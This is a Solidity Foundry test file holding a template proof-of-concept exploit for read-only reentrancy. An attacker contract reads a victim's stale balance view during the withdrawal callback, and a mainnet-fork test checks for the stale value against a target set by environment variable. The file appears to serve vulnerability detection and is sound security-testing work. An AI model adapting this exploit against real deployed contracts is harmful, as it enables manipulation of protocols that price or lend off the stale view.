// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Read-only reentrancy (stale view mid-callback)
/// @notice Detector: read-only-reentrancy. A view function reads state that
///         a mutating function only updates AFTER an external call. During
///         the callback the view returns a STALE value, and any contract
///         that prices / lends / settles off that view acts on wrong data.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the view function to the
///      target's real one (balanceOf / getPrice / totalSupply / getReserves).

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
    // TODO: the view that reads state updated after the external call.
    function balanceOf(address who) external view returns (uint256);
}

contract ReadOnlyAttacker {
    IVictim public immutable victim;
    uint256 public staleValue;
    bool public captured;

    constructor(address victim_) {
        victim = IVictim(victim_);
    }

    function attack() external payable {
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (!captured) {
            captured = true;
            // Mid-callback: victim has sent ETH but not yet updated state.
            staleValue = victim.balanceOf(address(this));
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        ReadOnlyAttacker attacker = new ReadOnlyAttacker(target);
        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}();

        uint256 settledValue = IVictim(target).balanceOf(address(attacker));
        console.log("view mid-callback (stale):", attacker.staleValue());
        console.log("view after settle:", settledValue);
        // On a fixed target the view already reflects the withdrawal
        // mid-callback, so stale == settled and this fails.
        assertTrue(
            attacker.staleValue() != settledValue,
            "exploit did not reproduce: view was already settled mid-callback"
        );
    }
}
